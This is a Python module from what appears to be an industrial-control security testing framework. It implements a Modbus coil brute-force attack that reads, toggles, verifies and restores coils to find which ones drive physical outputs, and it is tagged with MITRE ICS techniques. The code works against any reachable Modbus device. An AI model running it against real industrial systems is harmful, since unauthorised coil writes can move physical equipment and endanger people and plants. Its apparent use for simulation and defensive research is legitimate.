"""
Coil Brute-Force Attack — Systematically toggles coils to discover active outputs.

MITRE ATT&CK for ICS:
  T0855 — Unauthorized Command Message
  T0831 — Manipulation of Control
"""

from __future__ import annotations

import asyncio
import logging

from ot_twin.attacks.base import BaseAttack
from ot_twin.models import AttackResult, ModbusTransaction, RegisterType

logger = logging.getLogger(__name__)


class CoilBruteforceAttack(BaseAttack):
    name = "coil_bruteforce"
    description = "Toggle all coils to discover which control physical outputs"
    mitre_techniques = ["T0855", "T0831"]

    def __init__(
        self,
        *args,
        coil_range: tuple[int, int] = (0, 8),
        toggle_delay: float = 0.5,
        restore: bool = True,
        **kwargs,
    ) -> None:
        """
        Args:
            coil_range: (start, end) range of coil addresses to test.
            toggle_delay: seconds between toggle and restore.
            restore: whether to restore original values after testing.
        """
        super().__init__(*args, **kwargs)
        self.coil_range = coil_range
        self.toggle_delay = toggle_delay
        self.restore = restore

    async def execute(self) -> AttackResult:
        original_values: dict[int, bool] = {}
        responsive_coils: list[int] = []
        affected: list[int] = []

        # Phase 1: Read all coil states
        for addr in range(self.coil_range[0], self.coil_range[1]):
            result = await self.client.read_coils(
                address=addr, count=1, device_id=self.unit_id,
            )
            if not result.isError():
                original_values[addr] = bool(result.bits[0])
                self._log_transaction(ModbusTransaction(
                    function_code=1,
                    register_type=RegisterType.COIL,
                    address=addr, count=1,
                    values=[int(result.bits[0])],
                ))

        # Phase 2: Toggle each coil
        for addr in range(self.coil_range[0], self.coil_range[1]):
            if addr not in original_values:
                continue

            toggled_value = not original_values[addr]

            # Write toggled value
            write_result = await self.client.write_coil(
                address=addr, value=toggled_value, device_id=self.unit_id,
            )
            if write_result.isError():
                continue

            self._log_transaction(ModbusTransaction(
                function_code=5,
                register_type=RegisterType.COIL,
                address=addr, values=[int(toggled_value)], is_write=True,
            ))

            await asyncio.sleep(self.toggle_delay)

            # Verify the write took effect
            verify = await self.client.read_coils(
                address=addr, count=1, device_id=self.unit_id,
            )
            if not verify.isError() and bool(verify.bits[0]) == toggled_value:
                responsive_coils.append(addr)
                affected.append(addr)
                logger.info(
                    "[%s] Coil %d is responsive (toggled %s → %s)",
                    self.name, addr, original_values[addr], toggled_value,
                )

            # Phase 3: Restore if configured
            if self.restore:
                await self.client.write_coil(
                    address=addr, value=original_values[addr], device_id=self.unit_id,
                )
                self._log_transaction(ModbusTransaction(
                    function_code=5,
                    register_type=RegisterType.COIL,
                    address=addr,
                    values=[int(original_values[addr])],
                    is_write=True,
                ))

        details = (
            f"Tested {len(original_values)} coils, "
            f"{len(responsive_coils)} responsive: {responsive_coils}"
        )
        logger.info("[%s] %s", self.name, details)

        values_before = {k: int(v) for k, v in original_values.items()}

        return AttackResult(
            attack_name=self.name,
            success=len(responsive_coils) > 0,
            details=details,
            registers_affected=affected,
            values_before=values_before,
        )
